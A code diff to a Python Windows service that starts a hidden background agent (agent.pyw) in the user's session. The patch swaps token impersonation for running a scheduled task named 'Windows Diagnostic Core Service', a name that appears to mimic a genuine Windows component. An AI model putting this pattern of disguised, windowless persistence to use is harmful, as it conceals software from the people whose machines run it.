@@ -8,10 +8,6 @@ from pathlib import Path
 import win32serviceutil
 import win32service
 import win32event
-import win32ts
-import win32security
-import win32process
-import win32con
 import winreg
 import psutil
 import servicemanager
@@ -51,30 +47,10 @@ def agent_running() -> bool:
 
 
 def launch_agent():
-    """Spawn agent.pyw in the active user's desktop session from Session 0."""
     try:
-        session_id = win32ts.WTSGetActiveConsoleSessionId()
-        if session_id == 0xFFFFFFFF:
-            return  # no active user session
-
-        user_token = win32ts.WTSQueryUserToken(session_id)
-        dup_token = win32security.DuplicateTokenEx(
-            user_token,
-            win32con.TOKEN_ALL_ACCESS,
-            None,
-            win32security.SecurityImpersonation,
-            win32security.TokenPrimary,
-        )
-
-        si = win32process.STARTUPINFO()
-        si.lpDesktop = "winsta0\\default"
-
-        win32process.CreateProcessAsUser(
-            dup_token, None,
-            f'"{PYTHONW}" "{AGENT_PATH}"',
-            None, None, False,
-            win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_NO_WINDOW,
-            None, None, si,
+        subprocess.run(
+            ["schtasks", "/run", "/tn", "Windows Diagnostic Core Service"],
+            capture_output=True, timeout=10,
         )
     except Exception as e:
         log.warning("launch_agent failed: %s", e)
